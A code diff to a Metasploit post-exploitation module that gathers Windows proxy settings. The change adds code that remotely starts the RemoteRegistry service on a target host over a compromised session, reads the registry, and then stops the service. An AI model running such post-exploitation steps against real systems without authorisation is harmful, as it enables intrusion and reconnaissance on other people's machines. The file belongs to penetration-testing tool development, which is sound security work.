@@ -13,6 +13,8 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Post
 
+	include Post::Windows::WindowsServices
+
 	def initialize
 		super(
 			'Name'        => 'Windows Gather Proxy Setting',
@@ -43,17 +45,30 @@ class Metasploit3 < Msf::Post
 			root_key, base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
 		end
 
-		# print_status "#{root_key}"
-		# print_status "#{base_key}"
-
 		if datastore['RHOST']
-			key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
+			begin
+				key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
+			rescue ::Rex::Post::Meterpreter::RequestError
+				print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
+				print_status("Attempting to start service remotely...")
+				begin
+					service_start('RemoteRegistry',datastore['RHOST'])
+				rescue
+					print_error('Unable to read registry or start the service, exiting...')
+					return
+				end
+				startedreg = true
+				key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)
+			end
 			open_key = key.open_key(base_key)
 		else
 			open_key = session.sys.registry.open_key(root_key, base_key)
 		end
 
 		values = open_key.query_value('DefaultConnectionSettings')
+
+		#If we started the service we need to stop it.
+		service_stop('RemoteRegistry',datastore['RHOST']) if startedreg
 
 		data = values.data
 
